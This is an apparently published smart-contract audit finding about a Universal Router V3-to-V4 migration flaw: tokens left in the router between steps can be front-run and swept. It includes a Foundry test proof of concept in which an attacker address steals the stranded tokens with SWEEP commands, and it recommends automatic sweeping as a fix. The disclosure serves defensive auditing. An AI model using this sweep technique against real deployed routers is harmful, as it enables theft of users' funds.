# [M] Multi-step migration process risks token loss due to front-running

## Summary
Severity: Medium
Contest weight: 0.5631
Dataset id: 22046
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The current implementation of the Universal Router allows for a multi-step migration process from V3 to V4 positions. This process, as demonstrated in the tests `test_v3PositionManager_burn` and `test_v4CLPositionmanager_Mint`, can be executed in separate transactions. In the first step, tokens are collected from the V3 position and left in the router contract. In a subsequent step, these tokens are used to mint a V4 position.

An incorrect migration due to user error or otherwise, introduces front running attack vectors. Between these steps, the tokens reside in the router contract allowing an attacker to front-run the second step of the migration process and steal the user's tokens.

The core issue stems from the fact that the `execute()` function does not automatically sweep remaining tokens back to the user at the end of each transaction. This leaves any unused or (un)intentionally stored tokens vulnerable to unauthorized sweeping by external parties.

Users who perform the migration in separate steps, or who fail to include a sweep command at the end of their transaction, risk losing all tokens collected from their V3 position.

The impact is exacerbated by the fact that users might naturally perceive the migration as a two-step process (exit V3, then enter V4), not realizing the risks of leaving tokens in the router between these steps.

## Proof of Concept
Add the test to `V3ToV4Migration.t.sol`
```solidity
    function test_v3PositionManager_burn_frontrunnable() public {
        vm.startPrank(alice);

        // before: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 0);
        assertEq(token1.balanceOf(address(router)), 0);

        // build up the params for (permit -> decrease -> collect)
        (,,,,,,, uint128 liqudiity,,,,) = v3Nfpm.positions(v3TokenId);
        (uint8 v, bytes32 r, bytes32 s) = _getErc721PermitSignature(address(router), v3TokenId, block.timestamp);
        IV3NonfungiblePositionManager.DecreaseLiquidityParams memory decreaseParams = IV3NonfungiblePositionManager
            .DecreaseLiquidityParams({
            tokenId: v3TokenId,
            liquidity: liqudiity,
            amount0Min: 0,
            amount1Min: 0,
            deadline: block.timestamp
        });
        IV3NonfungiblePositionManager.CollectParams memory collectParam = IV3NonfungiblePositionManager.CollectParams({
            tokenId: v3TokenId,
            recipient: address(router),
            amount0Max: 0,
            amount1Max: 0
        });

        // build up univeral router commands
        bytes memory commands = abi.encodePacked(
            bytes1(uint8(Commands.V3_POSITION_MANAGER_PERMIT)),
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // decrease
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)), // collect
            bytes1(uint8(Commands.V3_POSITION_MANAGER_CALL)) // burn
        );

        bytes[] memory inputs = new bytes[](4);
        inputs[0] = abi.encodePacked(
            IERC721Permit.permit.selector, abi.encode(address(router), v3TokenId, block.timestamp, v, r, s)
        );
        inputs[1] =
            abi.encodePacked(IV3NonfungiblePositionManager.decreaseLiquidity.selector, abi.encode(decreaseParams));
        inputs[2] = abi.encodePacked(IV3NonfungiblePositionManager.collect.selector, abi.encode(collectParam));
        inputs[3] = abi.encodePacked(IV3NonfungiblePositionManager.burn.selector, abi.encode(v3TokenId));

        snapStart("V3ToV4MigrationTest#test_v3PositionManager_burn");
        router.execute(commands, inputs);
        snapEnd();

        // after: verify token0/token1 balance in router
        assertEq(token0.balanceOf(address(router)), 9999999999999999999);
        assertEq(token1.balanceOf(address(router)), 9999999999999999999);

        // Attacker front-runs and sweeps the funds
        address attacker = makeAddr("ATTACKER");
        assertEq(token0.balanceOf(attacker), 0);
        assertEq(token1.balanceOf(attacker), 0);
        uint256 routerBalanceBeforeAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceBeforeAttack1 = token1.balanceOf(address(router));

        vm.startPrank(attacker);

        bytes memory attackerCommands = abi.encodePacked(
            bytes1(uint8(Commands.SWEEP)),
            bytes1(uint8(Commands.SWEEP))
        );

        bytes[] memory attackerInputs = new bytes[](2);
        attackerInputs[0] = abi.encode(address(token0), attacker, 0);
        attackerInputs[1] = abi.encode(address(token1), attacker, 0);

        router.execute(attackerCommands, attackerInputs);

        vm.stopPrank();

        uint256 routerBalanceAfterAttack0 = token0.balanceOf(address(router));
        uint256 routerBalanceAfterAttack1 = token1.balanceOf(address(router));

        assertEq(routerBalanceAfterAttack0, 0, "Router should have no token0 left");
        assertEq(routerBalanceAfterAttack1, 0, "Router should have no token1 left");
        assertEq(token0.balanceOf(attacker), routerBalanceBeforeAttack0);
        assertEq(token1.balanceOf(attacker), routerBalanceBeforeAttack1);
    }
```

## Recommendation
Consider implementing an automatic token sweep at the end of each execute() call. Any tokens left in the router should be returned to the transaction initiator. Alternatively, provide helper functions or clear guidelines for combining V3 exit and V4 entry into a single transaction and/or add clear comments to the V3_POSITION_MANAGER_CALL execution.
